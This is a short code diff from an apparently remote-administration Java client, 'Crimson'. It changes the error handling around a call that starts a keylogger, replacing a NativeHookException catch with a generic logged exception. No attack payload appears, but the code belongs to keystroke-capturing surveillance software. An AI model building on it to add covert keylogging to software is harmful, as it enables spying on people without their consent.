@@ -20,7 +20,6 @@ package com.subterranean_security.crimson.client;
 import java.awt.HeadlessException;
 import java.io.File;
 
-import org.jnativehook.NativeHookException;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -75,9 +74,8 @@ public class Client {
 				Keylogger.start(ic.getKeyloggerFlushMethod(), ic.getKeyloggerFlushValue());
 			} catch (HeadlessException e) {
 				// ignore
-			} catch (NativeHookException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
+			} catch (Exception e) {
+				log.error("Failed to start keylogger: {}", e.getMessage());
 			}
 		}
 
